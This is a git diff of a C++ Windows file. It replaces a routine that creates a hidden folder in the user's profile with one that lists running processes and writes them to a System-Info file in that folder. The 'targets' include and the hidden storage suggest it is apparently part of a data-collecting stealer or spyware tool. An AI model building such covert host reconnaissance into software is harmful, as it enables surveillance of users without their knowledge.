@@ -15,44 +15,48 @@
 |                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                         |
 ==================================================================================================================|
 */
-#include "../scripts.h"
+
+#include "../targets.h"
 #include "../../config/config.h"
+
 #include <windows.h>
+#include <tlhelp32.h>
 #include <Lmcons.h>
-#include <direct.h>
-#include <string.h>
+#include <fstream>
 
-std::wstring StringToWideString(const std::string&);
-
-void manager::MakeDirs()
+void cursystem::GetProcesses()
 {
 	TCHAR string[UNLEN + 1];
 	DWORD size = UNLEN + 1;
 	GetUserName((TCHAR*)string, &size);
 	std::wstring ws(string);
 	std::string userName(ws.begin(), ws.end());
-	std::string paths [2] = {
 
-		"C:/Users/" + userName + config::path,
-		"C:/Users/" + userName + config::path +"/System-Info"
+	std::string path = "C:/Users/" + userName + config::path + "/System-Info/processes.txt";
 
-	};
-
-
-	std::wstring wpathto = StringToWideString(paths[0]);
-	for (size_t i = 0; i < std::size(paths); i++)
-	{
-		int result = _mkdir(paths[i].c_str());
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE) {
+		std::cerr << "Failed to create process snapshot" << std::endl;
 	}
 
-	BOOL success = SetFileAttributes(wpathto.c_str(), FILE_ATTRIBUTE_HIDDEN);
-}
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
 
-std::wstring StringToWideString(const std::string& str) {
+	if (!Process32First(snapshot, &entry)) {
+		std::cerr << "Failed to get first process entry" << std::endl;
+		CloseHandle(snapshot);
+	}
 
+	do {
+		std::wstring processNameW(entry.szExeFile);
+		std::string processName(processNameW.begin(), processNameW.end());
+		std::ofstream file(path, std::ios::app);
+		if (file.is_open())
+		{
+			file << "processe name: " << processName << std::endl;
+		}
 
-	int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
-	std::wstring wideStr(length, 0);
-	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wideStr[0], length);
-	return wideStr;
+		file.close();
+	} while (Process32Next(snapshot, &entry));
+	CloseHandle(snapshot);
 }
